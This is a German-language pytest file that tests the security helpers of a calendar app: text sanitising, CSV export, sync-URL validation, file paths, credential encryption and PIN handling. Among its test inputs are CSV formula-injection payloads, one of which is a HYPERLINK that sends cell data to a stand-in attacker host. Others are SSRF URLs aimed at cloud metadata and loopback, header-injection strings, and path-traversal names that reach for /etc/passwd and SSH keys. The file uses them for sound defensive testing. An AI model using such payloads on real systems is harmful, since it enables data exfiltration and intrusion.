"""Unit-Tests der Sicherheitsbausteine."""
import os
import stat
from pathlib import Path

import pytest

from pycal.security import (CredentialVault, RateLimiter, SecurityError,
                            constant_time_compare, hash_pin, redact,
                            safe_output_path, sanitize_csv_cell, sanitize_text,
                            validate_sync_url, verify_pin)


# ---------------- Textbereinigung ----------------
def test_control_chars_are_removed():
    assert sanitize_text("A\x00B\x1b[31mC") == "ABC"


def test_crlf_is_normalized():
    assert "\r" not in sanitize_text("Zeile1\r\nZeile2")


def test_bidi_override_is_stripped():
    # "Trojan Source": U+202E dreht die Anzeigerichtung um
    assert "‮" not in sanitize_text("Rechnung‮gnp.exe")


def test_length_is_capped():
    assert len(sanitize_text("x" * 50_000)) == 10_000


# ---------------- CSV-Formel-Injection ----------------
@pytest.mark.parametrize("payload", [
    "=1+1", "+1+1", "-1+1", "@SUM(A1)", "=cmd|'/c calc'!A1",
    '=HYPERLINK("http://böse.example/?d="&A1,"Klick")',
])
def test_formula_payloads_are_neutralised(payload):
    assert sanitize_csv_cell(payload).startswith("'")


def test_harmless_values_stay_unchanged():
    assert sanitize_csv_cell("Zahnarzt") == "Zahnarzt"


# ---------------- SSRF ----------------
@pytest.mark.parametrize("url", [
    "http://127.0.0.1/cal",                     # Klartext + Loopback
    "https://127.0.0.1/cal",                    # Loopback
    "https://169.254.169.254/latest/meta-data", # Cloud-Metadaten
    "https://10.0.0.5/dav",                     # privates Netz
    "https://[::1]/dav",                        # IPv6-Loopback
    "file:///etc/passwd",                       # falsches Schema
    "gopher://evil.example/x",                  # falsches Schema
    "https://user:geheim@example.com/dav",      # Zugangsdaten in der URL
    "https://example.com/\r\nInjected: 1",      # Header-Injection
])
def test_dangerous_urls_are_rejected(url):
    with pytest.raises(SecurityError):
        validate_sync_url(url)


def test_public_https_url_is_accepted():
    assert validate_sync_url("https://example.com/dav/", resolve_dns=False)


# ---------------- Pfade ----------------
@pytest.mark.parametrize("name", [
    "../../etc/passwd", "/etc/shadow", "..\\..\\windows\\system32\\cfg",
    "~/.ssh/id_rsa",
])
def test_path_traversal_is_blocked(tmp_path, name):
    result = safe_output_path(tmp_path, name)
    assert result.parent == tmp_path.resolve()
    assert ".." not in result.name


def test_nul_byte_in_filename(tmp_path):
    assert "\x00" not in safe_output_path(tmp_path, "a\x00b.csv").name


# ---------------- Zugangsdaten ----------------
def test_vault_roundtrip(tmp_path):
    vault = CredentialVault(tmp_path / "device.key")
    token = vault.encrypt("sehr-geheim")
    assert "sehr-geheim" not in token
    assert vault.decrypt(token) == "sehr-geheim"


def test_vault_key_file_is_private(tmp_path):
    key = tmp_path / "device.key"
    CredentialVault(key)
    mode = stat.S_IMODE(os.stat(key).st_mode)
    assert mode == 0o600


def test_vault_rejects_tampered_token(tmp_path):
    vault = CredentialVault(tmp_path / "device.key")
    token = vault.encrypt("geheim")
    broken = token[:-4] + ("AAAA" if not token.endswith("AAAA") else "BBBB")
    with pytest.raises(Exception):
        vault.decrypt(broken)


def test_vault_wipe_invalidates_secrets(tmp_path):
    vault = CredentialVault(tmp_path / "device.key")
    token = vault.encrypt("geheim")
    vault.wipe()
    with pytest.raises(Exception):
        vault.decrypt(token)


# ---------------- PIN ----------------
def test_pin_hash_is_salted_and_verifiable():
    a, b = hash_pin("1234"), hash_pin("1234")
    assert a != b
    assert verify_pin("1234", a) and not verify_pin("4321", a)


def test_pin_hash_has_no_plaintext():
    assert "1234" not in hash_pin("1234")


def test_rate_limiter_locks_after_failures():
    limiter = RateLimiter(max_attempts=3, base_lockout=60)
    for _ in range(3):
        limiter.record_failure()
    with pytest.raises(SecurityError):
        limiter.check()


def test_rate_limiter_resets_on_success():
    limiter = RateLimiter(max_attempts=2, base_lockout=60)
    limiter.record_failure()
    limiter.record_success()
    limiter.check()


def test_constant_time_compare():
    assert constant_time_compare("abc", "abc")
    assert not constant_time_compare("abc", "abd")


# ---------------- Logging ----------------
def test_redact_removes_secrets():
    assert "geheim" not in redact("https://max:geheim@dav.example.com/")
    assert "abc123" not in redact("Authorization: abc123")


# ---------------- Krypto-Unterbauten ----------------
def test_both_crypto_backends_are_interchangeable(tmp_path, monkeypatch):
    """Ein mit 'cryptography' erzeugtes Token muss 'pycryptodome' lesen können.

    Für Android ist das wichtig: dort wird je nach Build-Umgebung der eine
    oder der andere Unterbau eingesetzt. Ein Wechsel darf gespeicherte
    Zugangsdaten nicht unlesbar machen.
    """
    from pycal import security

    available = []
    if security._CgAESGCM is not None:
        available.append("cryptography")
    if security._PcAES is not None:
        available.append("pycryptodome")
    if len(available) < 2:
        pytest.skip(f"nur ein Unterbau installiert: {available}")

    vault = CredentialVault(tmp_path / "device.key")
    for writer in available:
        monkeypatch.setattr(security, "CRYPTO_BACKEND", writer)
        token = vault.encrypt("geheim-" + writer)
        for reader in available:
            monkeypatch.setattr(security, "CRYPTO_BACKEND", reader)
            assert vault.decrypt(token) == "geheim-" + writer


def test_fallback_backend_still_detects_tampering(tmp_path, monkeypatch):
    """Auch der Ersatz-Unterbau muss manipulierte Token abweisen (GCM-Tag)."""
    from pycal import security
    if security._PcAES is None:
        pytest.skip("pycryptodome nicht installiert")
    monkeypatch.setattr(security, "CRYPTO_BACKEND", "pycryptodome")
    vault = CredentialVault(tmp_path / "device.key")
    token = vault.encrypt("geheim")
    raw = bytearray(__import__("base64").b64decode(token))
    raw[-1] ^= 0x01                     # ein Bit im Authentifizierungs-Tag
    broken = __import__("base64").b64encode(bytes(raw)).decode()
    with pytest.raises(Exception):
        vault.decrypt(broken)


def test_backend_name_is_reported():
    """Die App muss benennen können, womit sie verschlüsselt."""
    from pycal.security import CRYPTO_BACKEND
    assert CRYPTO_BACKEND in {"cryptography", "pycryptodome", "none"}
